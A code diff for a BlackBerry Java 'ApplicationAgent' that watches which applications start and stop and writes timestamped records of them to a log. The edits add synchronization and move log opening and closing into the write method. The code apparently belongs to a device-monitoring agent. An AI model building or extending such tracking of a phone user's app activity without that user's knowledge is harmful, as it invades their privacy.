@@ -77,11 +77,11 @@ public final class ApplicationAgent extends Agent implements
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualStart()
      */
-    public void actualStart() {
+    public synchronized void actualStart() {
         //#ifdef DEBUG_TRACE
         debug.trace("actualStart addApplicationListObserver");
         //#endif
-        log.createLog(null);
+       
         AppListener.getInstance().addApplicationListObserver(this);
     }
 
@@ -89,12 +89,12 @@ public final class ApplicationAgent extends Agent implements
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualStop()
      */
-    public void actualStop() {
+    public synchronized void actualStop() {
         //#ifdef DEBUG_TRACE
         debug.trace("actualStop removeApplicationListObserver");
         //#endif
         AppListener.getInstance().removeApplicationListObserver(this);
-        log.close();
+       
     }
 
     /*
@@ -138,7 +138,7 @@ public final class ApplicationAgent extends Agent implements
             final String name = (String) startedListName.elementAt(i);
             final String mod = (String) startedListMod.elementAt(i);
             //#ifdef DEBUG_TRACE
-            debug.trace(name + " START");
+            debug.trace(name + " START " + mod);
             //#endif
             writeLog(name, "START", mod);
         }
@@ -148,9 +148,9 @@ public final class ApplicationAgent extends Agent implements
             final String name = (String) stoppedListName.elementAt(i);
             final String mod = (String) stoppedListMod.elementAt(i);
             //#ifdef DEBUG_TRACE
-            debug.trace(name + " STOP");
+            debug.trace(name + " STOP" + mod);
             //#endif
-            writeLog(name, "STOP", mod);
+            writeLog(name, "STOP " , mod);
         }
         
         //#ifdef DEBUG_TRACE
@@ -181,7 +181,7 @@ public final class ApplicationAgent extends Agent implements
         return false;
     }
 
-    private void writeLog(final String appName, final String condition,
+    private synchronized void writeLog(final String appName, final String condition,
             final String mod) {
         final byte[] tm = (new DateTime()).getStructTm();
 
@@ -191,7 +191,10 @@ public final class ApplicationAgent extends Agent implements
         items.addElement(WChar.getBytes(condition, true));
         items.addElement(WChar.getBytes(mod, true));
         items.addElement(Utils.intToByteArray(LOG_DELIMITER));
+        
+        log.createLog(null);
         log.writeLogs(items);
+        log.close();
 
     }
 }
